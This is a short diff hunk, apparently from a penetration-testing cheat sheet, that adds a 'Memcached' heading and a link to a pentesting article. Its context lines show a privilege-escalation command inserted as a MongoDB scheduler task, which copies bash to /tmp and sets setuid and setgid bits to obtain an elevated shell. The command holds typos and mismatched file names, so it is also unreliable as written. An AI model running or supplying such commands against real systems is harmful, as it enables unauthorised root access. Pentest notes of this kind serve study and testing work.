@@ -323,5 +323,5 @@ mongo -p -u <userid> scheduler
 
 db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown <USERAME>:admin /tmp/hackedbash; chmodg+s /tmp/hackedbash; chmod u+s /tmp/hackedbash"});
 ```
-
-
+### [Memcached]
+https://www.hackingarticles.in/penetration-testing-on-memcached-server/
